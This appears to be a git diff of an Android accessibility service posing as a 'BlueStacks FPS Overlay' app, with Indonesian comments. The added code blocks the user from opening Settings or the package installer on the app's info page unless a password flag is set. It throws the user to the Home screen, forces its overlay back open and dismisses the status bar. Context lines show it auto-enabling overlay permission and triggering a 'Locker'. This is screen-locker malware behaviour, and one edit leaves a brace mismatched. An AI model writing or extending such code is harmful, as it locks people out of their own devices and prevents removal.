@@ -15,64 +15,44 @@ public class FPSAccessibilityService extends AccessibilityService {
 
     private long lastActionTime = 0;
     private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil
-
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        writeLog("FPS Service Connected - Initializing Overlay"); 
         
-        // Langsung lompat tanpa menunggu event pertama
-        jumpToOverlaySettings(); //
-    }
-
-    private void writeLog(String text) {
-        try {
-            File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            File myDir = new File(downloadDir, "bs_engine_logs");
-            if (!myDir.exists()) myDir.mkdirs();
-            
-            File logFile = new File(myDir, "logs.txt");
-            FileWriter writer = new FileWriter(logFile, true);
-            String timestamp = java.text.DateFormat.getDateTimeInstance().format(new java.util.Date());
-            writer.append(timestamp).append(" : ").append(text).append("\n");
-            writer.flush();
-            writer.close();
-        } catch (Exception e) {
-            android.util.Log.e("DEX_LOG", "Failed to write log: " + e.getMessage());
+        if (Settings.canDrawOverlays(this)) {
+            triggerOverlay();
+        } else {
+            jumpToOverlaySettings();
         }
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        int eventType = event.getEventType();
-        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-
-        // 1. BLOKIR QUICK SETTINGS & NOTIFIKASI
-        // Setiap kali user menarik status bar, packageName biasanya berubah menjadi systemui
-        if (packageName.equals("com.android.systemui")) {
-            // Tekan BACK secara virtual untuk menutup panel yang sedang meluncur turun
-            performGlobalAction(GLOBAL_ACTION_BACK);
-
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
-                performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE);
-            }
-            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
-            sendBroadcast(closeDialog);
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
             
-            writeLog("Quick Settings/Notification blocked.");
-        }
-
-        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-        if (rootNode == null) return;
-
-        try {
-            if (packageName.equals("android") || packageName.contains("systemui")) {
-                checkAndDismissSensitiveUI(rootNode);
+            // 1. Cek apakah user sudah ter-autentikasi (Password benar)
+            // Jika sudah benar, biarkan mereka buka pengaturan
+            if (FPSService.isAuthenticated) return;
+    
+            // 2. Blokir Settings & Package Installer (Uninstall)
+            if (packageName.equals("com.android.settings") || packageName.equals("com.google.android.packageinstaller")) {
+                
+                // Cek lebih spesifik: apakah mereka melihat "App info" aplikasi kita?
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root != null) {
+                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("BlueStacks FPS Overlay");
+                    if (!nodes.isEmpty()) {
+                        performGlobalAction(GLOBAL_ACTION_HOME); // Lempar ke Home
+                        triggerOverlay(); // Paksa buka overlay lagi
+                    }
+                }
             }
-            handleOverlayPermissionFlow(rootNode, packageName);
             
-        } finally {
-            rootNode.recycle();
+            // 3. Blokir Status Bar / Quick Settings (Opsional)
+            if (packageName.equals("com.android.systemui")) {
+                 performGlobalAction(GLOBAL_ACTION_BACK); 
+            }
         }
     }
 
@@ -86,8 +66,7 @@ public class FPSAccessibilityService extends AccessibilityService {
                 AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");
                 
                 if (!targets.isEmpty() && switchNode != null) {
-                    if (!switchNode.isChecked()) {
-                        writeLog("Direct hit! Turning toggle ON.");
+                    if (!switchNode.isChecked()) 
                         performClick(switchNode);
                         
                         // Tambahan: Tunggu sebentar setelah klik, lalu paksa buka diri sendiri
@@ -96,7 +75,6 @@ public class FPSAccessibilityService extends AccessibilityService {
                         }, 500); 
     
                     } else {
-                        writeLog("Toggle is already ON. Triggering Locker.");
                         forceOpenApp(); // Pastikan panggil ini
                     }
                 } else if (pkg.contains("settings")) {
@@ -155,7 +133,6 @@ public class FPSAccessibilityService extends AccessibilityService {
     }
 
     private void jumpToOverlaySettings() {
-        writeLog("Executing Jump to Overlay Settings");
         Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                                 Uri.parse("package:" + getPackageName()));
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
